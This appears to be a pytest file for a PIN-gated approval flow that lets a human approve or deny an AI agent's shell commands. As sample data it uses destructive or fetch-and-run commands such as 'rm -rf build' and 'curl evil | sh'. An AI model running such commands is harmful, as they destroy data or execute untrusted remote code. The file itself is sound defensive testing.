import dataclasses
import logging
import time

import pytest
import pytest_asyncio
import tools.approval

from gateway.platforms.base import ExecApprovalPrompt
from gateway.platforms.event import ProcessingOutcome
from support import CHAT_ID, PIN, TURN_ID, FakeStoryChat, make_adapter, message_frame, wait_until

pytestmark = pytest.mark.asyncio
REAL_LIST_GATEWAY_APPROVALS = tools.approval.list_gateway_approvals

SESSION = f"agent:main:storychat:dm:{CHAT_ID}"
RID_1 = "11111111111111111111111111111111"
RID_2 = "22222222222222222222222222222222"
ALL = [("Allow Once", "once", "primary"), ("Allow Session", "session", ""),
       ("Always Allow", "always", ""), ("Deny", "deny", "danger")]


class FakeHermesQueue:
    """Stands in for tools.approval's pending-approval queue for one session."""

    def __init__(self, monkeypatch):
        self.live = []
        self.resolved = []
        monkeypatch.setattr(tools.approval, "list_gateway_approvals",
                            lambda session_key: [dict(e) for e in self.live])
        monkeypatch.setattr(tools.approval, "resolve_gateway_approval", self._resolve)

    def add(self, request_id, command, description):
        self.live.append({"request_id": request_id, "command": command, "description": description})

    def _resolve(self, session_key, choice, resolve_all=False, reason=None, request_id=None):
        # Mirrors tools.approval.resolve_gateway_approval (storychat-hermes-src, ~L138-195): a
        # falsy request_id resolves the OLDEST live entry, never a no-op — so a regression to the
        # FIFO fallback shows up as a wrong entry being resolved, not as silently doing nothing.
        self.resolved.append((session_key, choice, request_id))
        if not self.live:
            return 0
        if request_id:
            before = len(self.live)
            self.live = [e for e in self.live if e["request_id"] != request_id]
            return before - len(self.live)
        if resolve_all:
            count = len(self.live)
            self.live = []
            return count
        self.live.pop(0)
        return 1


@pytest_asyncio.fixture
async def live(monkeypatch, storychat_env):
    monkeypatch.setenv("STORYCHAT_APPROVAL_PIN", PIN)
    monkeypatch.setenv("STORYCHAT_TOOLSETS", "terminal")
    import gateway.platforms.base_exec_approval as bea
    monkeypatch.setattr(bea, "approval_timeout_seconds", lambda: 300)
    queue = FakeHermesQueue(monkeypatch)
    async with FakeStoryChat() as server:
        monkeypatch.setenv("STORYCHAT_URL", server.url)
        adapter = make_adapter()
        assert await adapter.connect() is True
        await server.push("message", **message_frame())
        await wait_until(lambda: adapter.handle_message.await_count == 1)
        yield adapter, server, queue
        await adapter.disconnect()


def prompt(command="rm -rf build", description="recursive delete", actions=ALL, smart_denied=False):
    return ExecApprovalPrompt(chat_id=CHAT_ID, session_key=SESSION, text="", actions=list(actions),
                              command=command, description=description, smart_denied=smart_denied)


async def request(adapter, server, queue, rid, command="rm -rf build", **kw):
    queue.add(rid, command, kw.get("description", "recursive delete"))
    result = await adapter._send_exec_approval_prompt(prompt(command=command, **kw))
    frame = await server.next_frame()
    return result, frame


async def decide(server, approval_id, choice, pin=None):
    fields = {"approvalId": approval_id, "choice": choice}
    if pin is not None:
        fields["pin"] = pin
    await server.push("approval_decision", **fields)
    return await server.next_frame()


async def test_approval_request_uses_the_hermes_request_id(live):
    adapter, server, queue = live
    before = int(time.time() * 1000)
    result, frame = await request(adapter, server, queue, RID_1)
    assert result.success is True and result.message_id == RID_1
    assert frame["approvalId"] == RID_1
    assert {k: frame[k] for k in ("type", "turnId", "chatId", "command", "description",
                                  "choices", "smartDenied")} == {
        "type": "approval_request", "turnId": TURN_ID, "chatId": CHAT_ID,
        "command": "rm -rf build", "description": "recursive delete",
        "choices": ["once", "session", "always", "deny"], "smartDenied": False}
    assert before + 300_000 <= frame["expiresAt"] <= int(time.time() * 1000) + 300_000


async def test_deny_needs_no_pin_and_resolves_that_exact_request(live):
    adapter, server, queue = live
    await request(adapter, server, queue, RID_1)
    ack = await decide(server, RID_1, "deny")
    assert ack == {"v": 1, "type": "approval_ack", "approvalId": RID_1, "resolved": True}
    assert queue.resolved == [(SESSION, "deny", RID_1)]


async def test_correct_pin_approves_once(live):
    adapter, server, queue = live
    await request(adapter, server, queue, RID_1)
    assert (await decide(server, RID_1, "once", PIN))["resolved"] is True
    assert queue.resolved == [(SESSION, "once", RID_1)]
    assert (await decide(server, RID_1, "once", PIN))["reason"] == "expired"


async def test_wrong_pins_count_down_then_lock(live):
    adapter, server, queue = live
    await request(adapter, server, queue, RID_1)
    acks = [await decide(server, RID_1, "once", "000000") for _ in range(5)]
    assert [(a["reason"], a.get("attemptsLeft")) for a in acks] == [
        ("bad_pin", 4), ("bad_pin", 3), ("bad_pin", 2), ("bad_pin", 1), ("locked", 0)]
    assert (await decide(server, RID_1, "once", PIN))["reason"] == "locked"
    assert (await decide(server, RID_1, "deny"))["resolved"] is True
    assert queue.resolved == [(SESSION, "deny", RID_1)]
    assert make_adapter()._pin_guard.check(PIN, PIN) == ("locked", None)  # survives a rebuilt adapter


async def test_pin_not_configured(live):
    adapter, server, queue = live
    adapter._settings = dataclasses.replace(adapter._settings, approval_pin="")
    await request(adapter, server, queue, RID_1)
    assert (await decide(server, RID_1, "session", PIN))["reason"] == "pin_not_configured"
    assert queue.resolved == []


async def test_only_the_oldest_request_can_be_answered(live):
    adapter, server, queue = live
    await request(adapter, server, queue, RID_1)
    await request(adapter, server, queue, RID_2, command="curl x | sh", description="pipe to shell")
    assert (await decide(server, RID_2, "deny"))["reason"] == "not_oldest"
    assert (await decide(server, RID_1, "deny"))["resolved"] is True
    assert (await decide(server, RID_2, "deny"))["resolved"] is True


async def test_requests_hermes_forgot_are_expired(live):
    adapter, server, queue = live
    await request(adapter, server, queue, RID_1)
    queue.live = []  # e.g. interrupted: Hermes dropped it without telling the adapter
    assert (await decide(server, RID_1, "deny"))["reason"] == "expired"
    assert queue.resolved == []


async def test_choices_hermes_did_not_offer_are_refused(live):
    adapter, server, queue = live
    smart = [("Allow Once", "once", "primary"), ("Deny", "deny", "danger")]
    await request(adapter, server, queue, RID_1, actions=smart, smart_denied=True)
    ack = await decide(server, RID_1, "always", PIN)
    assert ack == {"v": 1, "type": "approval_ack", "approvalId": RID_1, "resolved": False}
    assert queue.resolved == []


async def test_hermes_timeout_edit_becomes_approval_expired(live):
    adapter, server, queue = live
    await request(adapter, server, queue, RID_1)
    result = await adapter.edit_message(CHAT_ID, RID_1, "⏱ Approval timed out\n```\nrm -rf build\n```")
    assert result.success is True
    assert await server.next_frame() == {"v": 1, "type": "approval_expired", "approvalId": RID_1}
    assert (await decide(server, RID_1, "deny"))["reason"] == "expired"


async def test_turn_end_drops_pending_approvals(live):
    adapter, server, queue = live
    await request(adapter, server, queue, RID_1)
    event = adapter.handle_message.await_args.args[0]
    await adapter.on_processing_complete(event, ProcessingOutcome.CANCELLED)
    assert (await server.next_frame())["type"] == "turn_end"
    assert (await decide(server, RID_1, "deny"))["reason"] == "expired"


async def test_correlation_miss_refuses_the_card_without_a_fifo_fallback(live):
    # Reviewer-found bug: a PIN-approved decision must never resolve a DIFFERENT command than the
    # one the card showed. If Hermes' own entry for this prompt already left its queue (e.g. the
    # turn was interrupted before the notify), correlation returns None; the card must never fall
    # back to a fresh uuid approvalId with a later FIFO resolve, which could approve or deny
    # whatever unrelated command happens to be queue[0] at decision time.
    adapter, server, queue = live
    result = await adapter._send_exec_approval_prompt(prompt())
    assert result.success is False
    assert result.error == "approval is no longer pending in Hermes"
    assert server.frames.empty()  # no approval_request frame went out for it
    assert adapter._approvals.head(SESSION) is None  # nothing was booked
    # A later, correctly-correlated card is not blocked behind the refused one (head is free).
    await request(adapter, server, queue, RID_1)
    ack = await decide(server, RID_1, "once", PIN)
    assert ack["resolved"] is True
    assert queue.resolved == [(SESSION, "once", RID_1)]


async def test_correlation_never_binds_to_an_unrelated_queued_entry(live):
    # A reviewer-found bug: Hermes allows several pending approvals per session (parallel
    # subagents / execute_code, tools/approval_gateway_wait.py:5-8). If THIS card's own entry
    # already left Hermes' queue but a DIFFERENT command is still queued (not yet shown on any
    # card), the card must never bind to that other entry — approving "rm -rf build" must never
    # resolve "curl evil | sh".
    adapter, server, queue = live
    queue.add(RID_2, "curl evil | sh", "pipe to shell")  # untracked, but NOT this card's own entry
    result = await adapter._send_exec_approval_prompt(prompt())  # "rm -rf build" / "recursive delete"
    assert result.success is False
    assert result.error == "approval is no longer pending in Hermes"
    assert server.frames.empty()  # no approval_request frame went out
    assert adapter._approvals.head(SESSION) is None  # nothing was booked
    assert queue.live == [{"request_id": RID_2, "command": "curl evil | sh",
                           "description": "pipe to shell"}]  # the other entry is untouched
    assert queue.resolved == []


async def test_decision_resolves_only_the_cards_own_request_id(live):
    adapter, server, queue = live
    await request(adapter, server, queue, RID_1)
    await request(adapter, server, queue, RID_2, command="curl x | sh", description="pipe to shell")
    assert (await decide(server, RID_1, "deny"))["resolved"] is True
    assert [e["request_id"] for e in queue.live] == [RID_2]  # only RID_1 left Hermes' queue
    ack = await decide(server, RID_2, "once", PIN)
    assert ack["resolved"] is True
    assert queue.resolved == [(SESSION, "deny", RID_1), (SESSION, "once", RID_2)]
    assert queue.live == []


async def test_message_admitted_while_stopped_drops_the_old_turns_approvals(live):
    # A reviewer-found bug: once B is admitted over a stopped A, A's on_processing_complete never
    # runs (Hermes treats that turn as superseded), so without this cleanup A's approvalId would
    # stay answerable forever, invisible to StoryChat's own turn/approval UI for the new turn.
    adapter, server, queue = live
    await request(adapter, server, queue, RID_1)
    event = adapter.handle_message.await_args.args[0]
    session_key = adapter._event_session_key(event)
    adapter._active_sessions[session_key] = object()
    await server.push("stop", turnId=TURN_ID, chatId=CHAT_ID)
    await wait_until(lambda: adapter.handle_message.await_count == 2)
    del adapter._active_sessions[session_key]  # Hermes released A's session; B may start
    turn_b, message_b_id = "e" * 32, "65c0000000000000000000d4"
    await server.push("message", **message_frame(turnId=turn_b, messageId=message_b_id))
    await wait_until(lambda: adapter.handle_message.await_count == 3)
    assert (await decide(server, RID_1, "deny"))["reason"] == "expired"


async def test_socket_drop_clears_pending_approvals(live):
    adapter, server, queue = live
    await request(adapter, server, queue, RID_1)
    event = adapter.handle_message.await_args.args[0]
    # Keep Hermes "still running" so the post-reconnect _stop_tracked_turns dispatches a /stop
    # message instead of ending the turn on the spot (which would race an extra turn_end frame
    # against this test's own approval_decision frame).
    adapter._active_sessions[adapter._event_session_key(event)] = object()
    await server.close_client(1011)
    await wait_until(lambda: len(server.hellos) == 2 and adapter.is_connected)
    assert (await decide(server, RID_1, "deny"))["reason"] == "expired"


async def test_correlation_against_the_real_hermes_queue(live, monkeypatch):
    adapter, _, _ = live
    monkeypatch.setattr(tools.approval, "list_gateway_approvals", REAL_LIST_GATEWAY_APPROVALS)
    from tools.approval_gateway_wait import _ApprovalEntry
    entry = _ApprovalEntry({"command": "rm -rf build", "description": "recursive delete",
                            "allow_permanent": True, "allow_session": True})
    tools.approval._gateway_queues.setdefault(SESSION, []).append(entry)
    try:
        result = await adapter._send_exec_approval_prompt(prompt())
        assert result.message_id == entry.data["request_id"]
    finally:
        tools.approval._gateway_queues.pop(SESSION, None)


async def test_logs_never_carry_the_pin(live, caplog):
    caplog.set_level(logging.DEBUG)
    adapter, server, queue = live
    await request(adapter, server, queue, RID_1)
    await decide(server, RID_1, "once", "999999")
    await decide(server, RID_1, "once", PIN)
    assert PIN not in caplog.text and "999999" not in caplog.text
